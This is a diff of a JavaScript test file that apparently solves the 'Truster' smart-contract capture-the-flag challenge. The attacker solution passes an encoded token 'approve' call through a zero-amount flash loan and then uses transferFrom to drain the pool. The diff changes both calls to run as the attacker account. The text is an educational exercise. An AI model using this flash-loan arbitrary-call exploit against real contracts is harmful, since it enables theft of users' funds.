@@ -36,11 +36,9 @@ describe('[Challenge] Truster', function () {
 
         let callData = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()])
 
-        await this.pool.flashLoan(0, attacker.address, this.token.address, callData)
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, callData)
 
-        console.log(this.token.address.allowance)
-
-        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL.toString())
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL.toString())
     });
 
     after(async function () {
